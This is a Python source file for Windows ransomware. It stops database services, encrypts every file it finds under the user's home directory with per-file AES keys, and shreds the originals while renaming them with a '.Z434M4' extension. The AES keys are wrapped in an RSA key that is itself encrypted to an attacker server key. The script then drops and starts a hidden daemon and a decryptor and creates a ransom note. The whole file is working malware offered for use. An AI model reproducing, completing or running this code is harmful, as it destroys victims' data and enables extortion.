import variables
import asymmetric
import get_files
import symmetric
import environment
import generate_keys
import utils

import os
import string
import random
import base64
import pickle
import gc
import subprocess
import ctypes

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes


def kill_databases():
    if utils.amiroot():  # Use Windows admin check
        # Stop SQL Server
        os.system('net stop MSSQLSERVER /y >nul 2>&1')
        # Stop MySQL
        os.system('net stop MySQL /y >nul 2>&1')
        # Stop MongoDB
        os.system('net stop MongoDB /y >nul 2>&1')
        # Stop PostgreSQL
        os.system('net stop postgresql-x64-14 /y >nul 2>&1')


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]
    
    # Load the key for cryptography library
    server_public_key = serialization.load_pem_public_key(key)
    
    encrypted = []
    for i in x:
        ciphertext = server_public_key.encrypt(
            i,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    extensions_map = {}  # Dictionary to store original extension mappings
    extensions_file_path = os.path.join(variables.ransomware_path, "file_extensions.dat")
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(extensions_file_path), exist_ok=True)
    
    # Load existing extensions file if it exists
    try:
        if os.path.exists(extensions_file_path):
            with open(extensions_file_path, 'rb') as ext_file:
                extensions_map = pickle.load(ext_file)
    except:
        pass
    
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file_bytes = base64.b64decode(found_file)
        found_file_str = found_file_bytes.decode('utf-8')

        try:
            # Read file content
            with open(found_file_bytes, 'rb') as f:
                file_content = f.read()
                
            # Get original file path, name and extension
            file_path, file_name = os.path.split(found_file_str)
            file_base, file_ext = os.path.splitext(file_name)
            
            # Encrypt the file
            encrypted = AES_obj.encrypt(file_content)
            
            # Shred the original file
            utils.shred(found_file_bytes)
            
            # Create new filename with malware extension (replacing original extension)
            new_file_name = os.path.join(file_path, file_base + ".Z434M4")
            
            # Store the mapping between encrypted filename and original extension
            extensions_map[new_file_name] = file_ext
            
            # Write encrypted file
            with open(new_file_name, 'wb') as f:
                f.write(encrypted)

            # Add to the list for key storage
            base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
            AES_and_base64_path.append((key, base64_new_file_name))
            
        except Exception as e:
            print(f"Error processing {found_file_str}: {str(e)}")
            continue

    # Save the extensions map
    with open(extensions_file_path, 'wb') as ext_file:
        pickle.dump(extensions_map, ext_file)
    
    # Encrypt the extensions file for extra security
    try:
        with open(extensions_file_path, 'rb') as f:
            ext_file_content = f.read()
        
        # Use a new key for extensions file
        ext_key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(ext_key)
        encrypted_ext = AES_obj.encrypt(ext_file_content)
        
        # Replace the plain file with encrypted version
        with open(extensions_file_path + ".Z434M4", 'wb') as f:
            f.write(encrypted_ext)
            
        # Remove original extensions file
        utils.shred(extensions_file_path.encode('utf-8'))
        
        # Store the extensions file key for decryption
        AES_and_base64_path.append((ext_key, base64.b64encode((extensions_file_path + ".Z434M4").encode('utf-8'))))
    except Exception as e:
        print(f"Error encrypting extensions file: {str(e)}")
    
    return AES_and_base64_path


def menu():
    try:
        os.makedirs(variables.test_path, exist_ok=True)  # Windows-friendly directory creation
    except OSError:
        pass

    kill_databases()
        
    files = get_files.find_files(os.path.expanduser('~'))  # Use Windows home directory
    
    print(f"Found {len(files)} files to encrypt")

    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key.encode('utf-8'))
    
    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.encrypted_client_private_key_path), exist_ok=True)
    
    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)
    
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    client_public_key_object = serialization.load_pem_public_key(Client_public_key)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

       # Add this conversion right before the encryption
        if isinstance(aes_key, str):
            aes_key = aes_key.encode('utf-8')

        encrypted_aes_key = client_public_key_object.encrypt(
            aes_key,  # Now this will be bytes
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.aes_encrypted_keys_path), exist_ok=True)
    
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1].decode('utf-8') + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_daemon_and_decryptor():
    # Ensure directories exist
    os.makedirs(os.path.dirname(variables.decryptor_path), exist_ok=True)
    
    with open(variables.decryptor_path, 'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path, 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    # Windows doesn't need chmod, but we need to ensure the files are executable
    # Start the daemon process
    subprocess.Popen([variables.daemon_path], shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    menu()
    utils.change_wallpaper()
    drop_daemon_and_decryptor()
    # Create ransom note
    utils.create_ransom_note()